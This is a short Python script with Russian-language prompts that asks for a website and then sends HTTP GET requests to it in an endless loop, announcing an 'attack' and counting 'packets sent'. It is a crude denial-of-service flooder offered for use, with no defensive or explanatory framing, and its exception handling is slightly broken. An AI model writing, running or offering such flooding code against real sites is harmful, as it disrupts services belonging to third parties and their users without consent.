print("Инициализация...")
import requests
from colorama import Fore, Style, Back
from os import system
system("clear")
site = input(Back.RED + Fore.BLACK + "Введите сайт: ")
print(Style.RESET_ALL)
i = 1
print("Атака начинается...")
while True:
	try:
		response = requests.get(f"http://{site}").text
		print(Fore.YELLOW + response)
		print(Fore.GREEN + f"Пакет послан {i}")
		print(Style.RESET_ALL)
		i = i + 1
	except ConnectionError:
		print("Такого сайта нет")